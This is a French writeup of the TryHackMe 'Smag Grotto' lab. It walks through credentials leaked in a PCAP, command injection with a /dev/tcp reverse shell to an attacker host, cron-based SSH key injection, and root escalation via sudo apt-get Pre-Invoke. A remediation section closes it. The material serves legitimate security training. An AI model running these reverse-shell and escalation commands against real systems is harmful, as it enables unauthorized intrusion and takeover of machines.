# 🚩 Smag Grotto — TryHackMe Writeup

> **Plateforme :** TryHackMe
> **Difficulté :** 🟢 Easy
> **Cible :** `<IP_CIBLE>`
> **OS :** 🐧 Linux (Ubuntu / Apache)
> **Flags :** `user.txt` & `root.txt`
> **Date :** 2026-11-01

---

## 📖 Contexte

**Smag Grotto** est une room TryHackMe de niveau facile qui enchaîne plusieurs techniques classiques de pentest :

- 📡 **Information Disclosure** — un fichier PCAP laissé sur le serveur web contient des identifiants en clair
- 🎯 **Virtual Host Enumeration** — découverte d'un sous-domaine `development.smag.thm`
- 💥 **Command Injection (RCE)** — formulaire admin vulnérable
- ⏰ **Cron Job Hijacking** — tâche root écrivant dans un fichier world-writable
- ⬆️ **PrivEsc via GTFOBins** — `sudo apt-get` mal configuré

La chaîne d'attaque est un excellent exemple de **mouvement latéral + escalade** progressive.

---

## 1. 🔍 Reconnaissance

### 1.1 Scan de ports

```bash
nmap -sC -sV -oA nmap/smag <IP_CIBLE>
```

| Port | État | Service | Description |
|------|------|---------|-------------|
| 22   | open | SSH     | OpenSSH |
| 80   | open | HTTP    | Apache Web Server |

### 1.2 Énumération web

```bash
dirsearch -u http://<IP_CIBLE>/ -e php,txt,html
```

Le fuzzing révèle un dossier accessible : **`/mail`**.

En naviguant sur `http://<IP_CIBLE>/mail`, on trouve :

- 📧 Un message réseau mentionnant une migration de `192.168.33.0/24` vers `10.10.0.0/8`
- 📎 Un fichier de capture : **`dHJhY2Uy.pcap`** (base64 de `trace2`)
- 🧑‍💼 Adresses e-mail citées : `netadmin@smag.thm`, `uzi@smag.thm`, `jake@smag.thm`
- ⚠️ Mention du composant **`email2web`** (indice sur une future injection)

> 🚨 **Information Disclosure** : un PCAP laissé sur un serveur web public est une erreur critique. Il peut contenir des identifiants, des tokens, des cookies de session…

---

## 2. ⚡ Armement & Accès initial

### 2.1 Analyse du PCAP

```bash
wget http://<IP_CIBLE>/mail/dHJhY2Uy.pcap
wireshark dHJhY2Uy.pcap
```

Filtre Wireshark :
```
http.request.method == "POST" && http contains "login"
```

On y découvre une requête `POST /login` avec les **identifiants en clair** :

| Champ | Valeur |
|-------|--------|
| **Username** | `helpdesk` |
| **Password** | `cH4nG3M3_n0w` |

Le **vhost** ciblé y apparaît aussi : `development.smag.thm`.

### 2.2 Configuration du Virtual Host

```bash
echo "<IP_CIBLE> development.smag.thm" | sudo tee -a /etc/hosts
```

### 2.3 RCE via le panneau admin

1. **Se connecter** sur `http://development.smag.thm/login.php` avec `helpdesk:cH4nG3M3_n0w`
2. Redirection vers `http://development.smag.thm/admin.php` → formulaire d'exécution de commandes (le fameux **`email2web`**)
3. **Préparer un listener** :
   ```bash
   nc -lvnp 4444
   ```
4. **Injecter un reverse shell** dans le formulaire :
   ```bash
   bash -c 'exec bash -i &>/dev/tcp/<IP_KALI>/4444 <&1'
   ```

**Shell obtenu** en tant que `www-data`.

> 🔍 `user.txt` est visible dans `/home/jake/` mais **inaccessible** avec les droits de `www-data` — il faut pivoter.

---

## 3. 🔄 Mouvement latéral — `www-data` → `jake`

### 3.1 Énumération locale

```bash
cat /etc/crontab
```

Un cron job **root** s'exécute chaque minute :

```bash
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

### 3.2 Analyse de la faille

```bash
ls -la /opt/.backups/jake_id_rsa.pub.backup
```

Le fichier est **modifiable par `www-data`** (world-writable ou droits trop larges). En y injectant notre clé publique, le cron la copiera automatiquement dans `authorized_keys` de `jake`.

### 3.3 Exploit Cron

1. **Générer une paire de clés** sur Kali :
   ```bash
   ssh-keygen -t rsa -b 4096 -f id_rsa_ctf
   ```

2. **Injecter la clé publique** sur la cible :
   ```bash
   echo "<CONTENU_DE_id_rsa_ctf.pub>" > /opt/.backups/jake_id_rsa.pub.backup
   ```

3. **Attendre 1 minute** (exécution du cron).

4. **Se connecter en SSH** :
   ```bash
   ssh -i id_rsa_ctf jake@<IP_CIBLE>
   ```

5. **Lire le flag user** :
   ```bash
   cat /home/jake/user.txt
   ```

✅ **Flag user récupéré.**

---

## 4. 🚀 Élévation de privilèges — `jake` → `root`

### 4.1 Inspection des privilèges

```bash
cat /home/jake/.bash_history
sudo -l
```

Règle sudo trouvée :

```bash
User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

> 🚨 **`apt-get` en `NOPASSWD`** est une porte grande ouverte vers `root` — voir GTFOBins.

### 4.2 Exploit GTFOBins

La commande classique `sudo apt-get changelog` échoue sur une machine CTF isolée (pas d'accès Internet). On utilise à la place l'option **`APT::Update::Pre-Invoke`** qui exécute une commande **avant** l'update :

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"
```

**Shell root obtenu** :

```bash
whoami
# root

cat /root/root.txt
```

✅ **Flag root récupéré.**

---

## 5. 🗺️ Résumé du parcours d'attaque

```
[Recon]       Port 80 → /mail → PCAP exposé
                ↓
[InfoDisc]    Wireshark → credentials helpdesk + vhost development.smag.thm
                ↓
[Auth Web]    Login admin → formulaire email2web
                ↓
[RCE]         Command Injection → reverse shell www-data
                ↓
[Cron Hijack] /opt/.backups/jake_id_rsa.pub.backup modifiable
                ↓
[SSH]         authorized_keys → connexion jake
                ↓
[Flag user]   /home/jake/user.txt
                ↓
[PrivEsc]     sudo apt-get NOPASSWD → GTFOBins
                ↓
[Flag root]   /root/root.txt
```

---

## 6. 🛡️ Remédiation

| Vulnérabilité | Recommandation |
|---------------|----------------|
| **PCAP exposé sur le web** | Ne jamais stocker de captures réseau / logs contenant des credentials dans un répertoire web ; ajouter une authentification ou déplacer hors du `DocumentRoot` |
| **Identifiants en clair dans le trafic** | Utiliser HTTPS + HSTS ; éviter les formulaires de login en HTTP |
| **Command Injection (`email2web`)** | Valider/stériliser les entrées ; ne jamais passer d'entrée utilisateur à `os.system()` / `shell=True` ; utiliser `escapeshellarg()` en PHP |
| **Cron root avec fichier modifiable** | Le fichier source du cron doit être la propriété de `root:root` en `600` ; le binaire lu par root ne doit jamais être dans un chemin accessible à `www-data` |
| **`authorized_keys` modifiable** | Restreindre `/home/jake/.ssh/` à `jake:jake` en `700`, `authorized_keys` en `600`, et **interdire** au cron root d'écrire dedans |
| **`sudo apt-get` en NOPASSWD** | Ne jamais autoriser `apt-get` en sudo sans restrictions : il permet l'exécution arbitraire via `-o APT::Update::Pre-Invoke` (GTFOBins) |
| **Principe du moindre privilège** | Auditer régulièrement `sudo -l` ; préférer des commandes précises (ex: `sudo /usr/bin/systemctl restart apache2`) plutôt que des binaires complets |

### 💡 Exemples de correctifs

**Cron sécurisé (fichier source root-only) :**

```bash
# ❌ Vulnérable
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

# ✅ Sûr — le fichier source est root:root 600 et hors chemin web
sudo chown root:root /opt/.backups/jake_id_rsa.pub.backup
sudo chmod 600 /opt/.backups/jake_id_rsa.pub.backup
```

**Alternative au cron `cat` :** utiliser `cp` depuis un dossier `root` en `0700` inaccessible à `www-data`.

**Remplacement de `sudo apt-get` :**

```bash
# /etc/sudoers.d/jake
jake ALL=(root) NOPASSWD: /usr/bin/systemctl restart apache2
```

---

## 7. 📚 Références

- [GTFOBins — apt-get](https://gtfobins.github.io/gtfobins/apt-get/)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — Information Disclosure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- [TryHackMe — Smag Grotto](https://tryhackme.com/room/smaggrotto)

---

*Writeup réalisé dans un cadre légal — machine CTF TryHackMe. Aucune cible réelle n'a été compromise.*
